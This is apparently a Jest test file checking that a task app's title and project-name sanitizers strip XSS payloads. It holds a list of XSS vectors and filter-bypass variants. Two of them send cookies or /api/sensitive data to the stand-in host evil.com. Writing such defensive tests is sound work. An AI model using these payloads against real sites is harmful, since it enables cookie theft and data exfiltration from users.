/**
 * XSS Protection Integration Tests
 * Tests that UI components properly sanitize user input and prevent XSS attacks
 */

import { render, screen } from '@testing-library/react';
import { sanitizeTaskTitle, sanitizeProjectName } from '@/lib/security';
import { Task } from '@/hooks/useTasks';

// Mock DOMPurify for consistent testing
jest.mock('dompurify', () => ({
  sanitize: jest.fn((input: string) => {
    if (typeof input !== 'string') {
      return '';
    }
    
    // Comprehensive mock that removes all dangerous content
    return input
      .replace(/<script.*?<\/script>/gi, '') // Remove script tags
      .replace(/<[^>]*>/g, '') // Remove all HTML tags
      .replace(/javascript:/gi, '') // Remove javascript: protocols
      .replace(/vbscript:/gi, '') // Remove vbscript: protocols
      .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '') // Remove event handlers with quotes
      .replace(/on\w+\s*=/gi, '') // Remove inline event handlers
      .replace(/expression\s*\([^)]*\)/gi, '') // Remove CSS expressions
      .replace(/eval\s*\([^)]*\)/gi, '') // Remove eval calls
      .replace(/data:text\/html[^,]*,/gi, '') // Remove data: HTML URLs
      .replace(/\\u[\da-fA-F]{4}/g, '') // Remove unicode escapes
      .trim();
  })
}));

// Mock hooks to provide test data
jest.mock('@/hooks/useTasks', () => ({
  useTasks: () => ({
    tasks: [],
    loading: false,
    error: null,
    addTask: jest.fn(),
    updateTask: jest.fn(),
    deleteTask: jest.fn()
  })
}));

jest.mock('@/hooks/useProjects', () => ({
  useProjects: () => ({
    projects: [],
    loading: false,
    error: null,
    addProject: jest.fn(),
    updateProject: jest.fn(),
    deleteProject: jest.fn()
  })
}));

jest.mock('@/hooks/useGoogleAnalytics', () => ({
  useGoogleAnalytics: () => ({
    event: jest.fn()
  })
}));

jest.mock('@/hooks/useTimeTracking', () => ({
  useTimeTracking: () => ({
    getElapsedTime: jest.fn(() => 0),
    formatTime: jest.fn(() => '00:00'),
    startTimeTracking: jest.fn(),
    stopTimeTracking: jest.fn(),
    startAllTimeTracking: jest.fn(),
    stopAllTimeTracking: jest.fn()
  })
}));

jest.mock('@/hooks/useLabels', () => ({
  useLabels: () => ({
    labels: [],
    loading: false,
    error: null,
    addLabel: jest.fn(),
    updateLabel: jest.fn(),
    deleteLabel: jest.fn()
  })
}));

describe('XSS Protection Integration Tests', () => {
  describe('sanitizeTaskTitle function', () => {
    it('should remove script tags from task titles', () => {
      const maliciousTitle = '<script>alert("xss")</script>Legitimate Task';
      const sanitized = sanitizeTaskTitle(maliciousTitle);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toBe('Legitimate Task');
    });

    it('should remove event handlers', () => {
      const maliciousTitle = 'onclick="alert(\'xss\')" Task Title';
      const sanitized = sanitizeTaskTitle(maliciousTitle);
      
      expect(sanitized).not.toContain('onclick=');
      expect(sanitized).toContain('Task Title');
    });

    it('should remove javascript protocols', () => {
      const maliciousTitle = 'javascript:alert("xss") Normal Task';
      const sanitized = sanitizeTaskTitle(maliciousTitle);
      
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).toContain('Normal Task');
    });

    it('should preserve safe content', () => {
      const safeTitle = 'Normal Task Title with Numbers 123';
      const sanitized = sanitizeTaskTitle(safeTitle);
      
      expect(sanitized).toBe(safeTitle);
    });
  });

  describe('sanitizeProjectName function', () => {
    it('should sanitize malicious project names', () => {
      const maliciousName = '<img src=x onerror=alert("xss")>Project';
      const sanitized = sanitizeProjectName(maliciousName);
      
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).toBe('Project');
    });

    it('should preserve legitimate project names', () => {
      const legitimateName = 'My Project 2024 (Phase 1)';
      const sanitized = sanitizeProjectName(legitimateName);
      
      expect(sanitized).toBe(legitimateName);
    });
  });

  describe('Real-world XSS scenarios', () => {
    const dangerousPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert("xss")>',
      '<svg onload=alert("xss")>',
      'javascript:alert("xss")',
      'vbscript:alert("xss")',
      '"><script>alert("xss")</script>',
      '<iframe src="javascript:alert(\'xss\')"></iframe>',
      '<object data="javascript:alert(\'xss\')"></object>',
      '<embed src="javascript:alert(\'xss\')">',
      '<form><input type="text" name="test">',
      'expression(alert("xss"))',
      'eval(alert("xss"))',
      'data:text/html,<script>alert("xss")</script>',
      '<script>fetch("/api/sensitive").then(r=>r.text()).then(d=>fetch("http://evil.com?"+d))</script>',
      '<script>document.location="http://evil.com?cookie="+document.cookie</script>'
    ];

    dangerousPayloads.forEach((payload, index) => {
      it(`should safely handle XSS payload ${index + 1}: ${payload.substring(0, 30)}...`, () => {
        const sanitizedTask = sanitizeTaskTitle(payload + ' Normal Content');
        const sanitizedProject = sanitizeProjectName(payload + ' Normal Content');

        // Verify dangerous patterns are removed
        expect(sanitizedTask).not.toMatch(/<script/i);
        expect(sanitizedTask).not.toMatch(/javascript:/i);
        expect(sanitizedTask).not.toMatch(/vbscript:/i);
        expect(sanitizedTask).not.toMatch(/on\w+=/i);
        expect(sanitizedTask).not.toMatch(/expression\s*\(/i);
        expect(sanitizedTask).not.toMatch(/eval\s*\(/i);
        expect(sanitizedTask).not.toMatch(/<iframe/i);
        expect(sanitizedTask).not.toMatch(/<object/i);
        expect(sanitizedTask).not.toMatch(/<embed/i);
        expect(sanitizedTask).not.toMatch(/<form/i);
        expect(sanitizedTask).not.toMatch(/data:text\/html/i);

        expect(sanitizedProject).not.toMatch(/<script/i);
        expect(sanitizedProject).not.toMatch(/javascript:/i);
        expect(sanitizedProject).not.toMatch(/vbscript:/i);

        // Verify legitimate content is preserved
        expect(sanitizedTask).toContain('Normal Content');
        expect(sanitizedProject).toContain('Normal Content');
      });
    });
  });

  describe('Input validation edge cases', () => {
    it('should handle null and undefined inputs', () => {
      expect(sanitizeTaskTitle(null as any)).toBe('');
      expect(sanitizeTaskTitle(undefined as any)).toBe('');
      expect(sanitizeProjectName(null as any)).toBe('');
      expect(sanitizeProjectName(undefined as any)).toBe('');
    });

    it('should handle non-string inputs', () => {
      expect(sanitizeTaskTitle(123 as any)).toBe('');
      expect(sanitizeTaskTitle({} as any)).toBe('');
      expect(sanitizeTaskTitle([] as any)).toBe('');
      expect(sanitizeProjectName(123 as any)).toBe('');
      expect(sanitizeProjectName({} as any)).toBe('');
      expect(sanitizeProjectName([] as any)).toBe('');
    });

    it('should handle empty strings', () => {
      expect(sanitizeTaskTitle('')).toBe('');
      expect(sanitizeProjectName('')).toBe('');
    });

    it('should handle very long inputs', () => {
      const longInput = 'a'.repeat(10000) + '<script>alert("xss")</script>';
      const sanitized = sanitizeTaskTitle(longInput);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized.length).toBeGreaterThan(0);
    });

    it('should handle unicode and special characters', () => {
      const unicodeInput = '🚀 Task with émojis and spëcial characters ñáéíóú 中文';
      const sanitized = sanitizeTaskTitle(unicodeInput);
      
      expect(sanitized).toContain('🚀');
      expect(sanitized).toContain('émojis');
      expect(sanitized).toContain('中文');
    });
  });

  describe('Security regression tests', () => {
    it('should prevent common bypass attempts', () => {
      const bypassAttempts = [
        '<SCRIPT>alert("xss")</SCRIPT>', // Case variation
        '<scr<script>ipt>alert("xss")</scr</script>ipt>', // Nested tags
        '<script>alert(String.fromCharCode(88,83,83))</script>', // Encoded XSS
        '<<SCRIPT>alert("xss");//<</SCRIPT>', // Malformed tags
        '<script src="data:text/javascript,alert(\'xss\')"></script>', // Data URI
        '\\u003cscript\\u003ealert("xss")\\u003c/script\\u003e', // Unicode escapes
        '<svg><script>alert("xss")</script></svg>', // SVG vector
        '<math><script>alert("xss")</script></math>', // MathML vector
      ];

      bypassAttempts.forEach((attempt, index) => {
        const sanitized = sanitizeTaskTitle(attempt + ' Normal Text');
        
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/alert\(/i);
        expect(sanitized).toContain('Normal Text');
      });
    });

    it('should handle mixed content scenarios', () => {
      const mixedContent = [
        'Legitimate task <script>alert("xss")</script> with normal text',
        'Project <img src=x onerror=alert("xss")> description continues',
        'Start <iframe src="javascript:evil()"></iframe> end text',
        'Valid content <object data="malicious.swf"></object> more content',
      ];

      mixedContent.forEach(content => {
        const sanitized = sanitizeTaskTitle(content);
        
        // Should preserve legitimate parts
        expect(sanitized).toMatch(/Legitimate|Project|Start|Valid/i);
        expect(sanitized).toMatch(/normal|description|end|content/i);
        
        // Should remove dangerous parts
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/<iframe/i);
        expect(sanitized).not.toMatch(/<object/i);
        expect(sanitized).not.toMatch(/javascript:/i);
      });
    });
  });

  describe('Performance considerations', () => {
    it('should handle sanitization of many items efficiently', () => {
      const startTime = Date.now();
      const testItems = 1000;
      
      for (let i = 0; i < testItems; i++) {
        const title = `Task ${i} <script>alert("xss")</script> content`;
        sanitizeTaskTitle(title);
      }
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Sanitization should be fast (arbitrary threshold for this test)
      expect(duration).toBeLessThan(1000); // Should complete in under 1 second
    });

    it('should not cause memory leaks with repeated sanitization', () => {
      // Test memory stability with repeated operations
      const iterations = 100;
      const testContent = '<script>alert("xss")</script>'.repeat(10);
      
      for (let i = 0; i < iterations; i++) {
        const result = sanitizeTaskTitle(testContent + ` iteration ${i}`);
        expect(result).not.toContain('<script>');
        expect(result).toContain(`iteration ${i}`);
      }
    });
  });
});